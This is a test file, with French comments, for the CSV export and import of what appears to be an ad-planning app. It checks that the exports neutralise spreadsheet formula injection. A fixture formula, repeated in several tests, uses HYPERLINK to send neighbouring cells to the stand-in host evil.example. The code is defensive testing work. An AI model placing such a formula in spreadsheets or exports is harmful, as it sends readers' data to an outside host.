import { describe, it, expect } from 'vitest';
import {
  csvCell, toCsv, neutraliserFormule, retirerNeutralisation, estNombreTableur, sheetNumber,
  DEBUTS_DE_FORMULE, COL_HYPOTHESIS,
} from '../src/adsmap/sheet';
import { parseCsv, buildImportPlan } from '../src/adsmap/import-sheet';
import { exporterTextes, type TexteStudio } from '../src/studios/textes/textes';
import { brief } from './l5c-fixtures';

/**
 * Injection de formule dans les exports CSV (CWE-1236).
 *
 * Un apprentissage saisi par un membre (`=HYPERLINK("https://evil.example/?d="&A2&B2;"Voir la preuve")`)
 * partait tel quel dans l'export Adsmap · ouvert dans Excel ou Sheets par un
 * autre utilisateur, il s'évaluait (exfiltration des cellules voisines). Les
 * guillemets RFC 4180 n'empêchent pas l'évaluation · seule l'apostrophe de tête
 * fait lire la cellule comme du texte.
 *
 * On vérifie la SORTIE exacte, octet par octet, pas la présence d'un appel.
 */

const PIEGE = '=HYPERLINK("https://evil.example/?d="&A2&B2;"Voir la preuve")';

describe('csvCell · neutralise tout début de formule, sortie exacte', () => {
  it.each([
    ['=1+1', "'=1+1"],
    ['+1', "'+1"],
    ['@SUM(A1)', "'@SUM(A1)"],
    ['\t=1', "'\t=1"],
    ['\r=1', `"'\r=1"`],               // \r · neutralisé PUIS entouré (saut de ligne)
    ['-1+1', "'-1+1"],
    ['-A1', "'-A1"],
    ['- 3 clics', "'- 3 clics"],
    ['-12.5', "'-12.5"],              // point décimal · pas une forme sheetNumber
    ['Bonjour', 'Bonjour'],
    ['Prix = 12', 'Prix = 12'],         // `=` au milieu · inoffensif
  ])('%j → %j', (entree, attendu) => {
    expect(csvCell(entree), `la cellule ${JSON.stringify(entree)} partirait évaluable dans le tableur`).toBe(attendu);
  });

  it('le piège de l’apprentissage sort neutralisé ET échappé', () => {
    expect(csvCell(PIEGE)).toBe(`"'=HYPERLINK(""https://evil.example/?d=""&A2&B2;""Voir la preuve"")"`);
  });

  it('chaque caractère de la liste est neutralisé · aucun n’est oublié', () => {
    expect([...DEBUTS_DE_FORMULE]).toEqual(['=', '+', '-', '@', '\t', '\r']);
    for (const c of DEBUTS_DE_FORMULE) {
      expect(neutraliserFormule(`${c}x`), `premier caractère ${JSON.stringify(c)} non neutralisé`).toBe(`'${c}x`);
    }
  });
});

describe('csvCell · un nombre reste un nombre lisible par le tableur', () => {
  it.each([
    ['-12,5', '-12,5'],
    ['-1', '-1'],                       // ce que rend sheetNumber(-1) · un nombre, pas une formule
    ['-0', '-0'],
    ['25,46', '25,46'],
  ])('forme stricte %j → %j', (entree, attendu) => {
    expect(csvCell(entree), `le nombre ${entree} a été préfixé · le tableur le lira comme du texte`).toBe(attendu);
  });

  it('les sorties mesurées de sheetNumber restent numériques (groupes U+202F)', () => {
    for (const n of [-12.5, -1, 1234.567, -1234567.891, -0.004, 1e21]) {
      const s = sheetNumber(n);
      expect(estNombreTableur(s), `sheetNumber(${n}) = ${JSON.stringify(s)} n'est pas reconnu comme nombre`).toBe(true);
      expect(csvCell(s)).toBe(s);
    }
  });

  it('un number fini part tel quel, même négatif', () => {
    expect(csvCell(-12.5)).toBe('-12.5');
    expect(csvCell(-3)).toBe('-3');
    expect(csvCell(-Infinity)).toBe("'-Infinity");   // pas fini · texte, donc neutralisé
  });

  it('avec le séparateur virgule, le nombre est entouré mais jamais préfixé', () => {
    expect(csvCell('-12,5', { separateur: ',' })).toBe('"-12,5"');
  });
});

describe('toCsv · la ligne exportée, exacte', () => {
  it('le piège dans « Apprentissages », un CPA négatif dans « CPA »', () => {
    const csv = toCsv([{
      Status: 'Terminé', 'Ad Concept': '@SUM(A1)', [COL_HYPOTHESIS]: '+1', Apprentissages: PIEGE,
      Learnings: '\t=1', CPA: sheetNumber(-12.5), Achats: 3, 'Ad Variable': 'Bonjour',
    }], { withComputed: true, bom: false });
    const champs = csv.split('\r\n')[1]!;
    expect(champs).toBe(
      "Terminé;;;'@SUM(A1);;;;'+1;;;;;;"
      + `"'=HYPERLINK(""https://evil.example/?d=""&A2&B2;""Voir la preuve"")"`
      + ";Bonjour;;'\t=1;;;;;-12,5;;;;;;;3",
    );
  });
});

describe('aller-retour · export puis import redonne la valeur saisie', () => {
  const corpus = [
    '=1+1', '+1', '-1', '@SUM(A1)', '\t=1', '\r=1', '-12,5', 'Bonjour', PIEGE,
    "'=déjà apostrophé", "''+deux", "'Hook' gagnant", "'", '', 'a;b', 'il a dit "non"', 'ligne1\nligne2',
  ];

  it('retirerNeutralisation ∘ neutraliserFormule = identité, sur tout le corpus', () => {
    for (const v of corpus) {
      expect(retirerNeutralisation(neutraliserFormule(v)), `aller-retour cassé pour ${JSON.stringify(v)}`).toBe(v);
    }
  });

  it('une apostrophe de tableur historique, non suivie d’une formule, n’est pas retirée', () => {
    expect(retirerNeutralisation("'Hook' gagnant")).toBe("'Hook' gagnant");
    expect(retirerNeutralisation("'")).toBe("'");
  });

  it('parseCsv(toCsv(…)) rend les valeurs d’origine, sans apostrophe', () => {
    const csv = toCsv(corpus.map((v) => ({ Apprentissages: v })), { delimiter: ',', bom: false });
    const lignes = parseCsv(csv).slice(1).filter((r) => r.length > 1);
    const col = [...toCsv([], { delimiter: ',', bom: false }).split('\r\n')[0]!.split(',')].indexOf('Apprentissages');
    expect(lignes.map((r) => r[col]), 'l’import garde l’apostrophe ajoutée à l’export').toEqual(corpus);
  });

  it('buildImportPlan · l’apprentissage et l’hypothèse reviennent tels que saisis', () => {
    const csv = toCsv([{
      Status: 'Terminé', 'BATCH #': 4, 'Ad Concept': '@Concept', '📎 Désire': 'Confiance', '📎 Angle(s)': 'Preuve',
      [COL_HYPOTHESIS]: '-20 % sur la page', 'Ad Format': 'Statique', 'Ad Type': 'Idéation', Apprentissages: PIEGE,
      'Date de lancement': '01/10/2026', Plateforme: 'Meta',
    }], { delimiter: ',' });
    expect(csv).toContain(`"'=HYPERLINK(`);   // l'export est bien neutralisé…
    const plan = buildImportPlan(csv, { today: new Date('2026-11-01') });
    expect(plan.ads).toHaveLength(1);
    expect(plan.ads[0]!.learning, '…et l’import retire l’apostrophe').toBe(PIEGE);
    expect(plan.ads[0]!.hypothesis).toBe('-20 % sur la page');
    expect(plan.concepts.map((c) => c.title)).toEqual(['@Concept']);
  });
});

describe('export Textes du studio · même neutralisation', () => {
  it('un texte qui commence par « = » ou « - » sort préfixé, toujours entouré', () => {
    const meta = { titre: 'T', marque: 'M', versionN: 1, versionId: '44444444-4444-4444-8444-444444444444', exporteLe: '2026-10-08T09:00:00.000Z', brief: brief() };
    const t: TexteStudio[] = [
      { id: 'a', type: 'hook', langue: 'fr', texte: PIEGE, sources: [] },
      { id: 'b', type: 'cta', langue: 'fr', texte: '- Livraison offerte', sources: [] },
      { id: 'c', type: 'cta', langue: 'fr', texte: 'Je cours avec', sources: [] },
    ];
    const lignes = exporterTextes(t, meta, 'csv').contenu.split('\r\n');
    expect(lignes[1]).toBe(`"Hook","fr","'=HYPERLINK(""https://evil.example/?d=""&A2&B2;""Voir la preuve"")",""`);
    expect(lignes[2]).toBe(`"CTA","fr","'- Livraison offerte",""`);
    expect(lignes[3]).toBe(`"CTA","fr","Je cours avec",""`);
  });
});
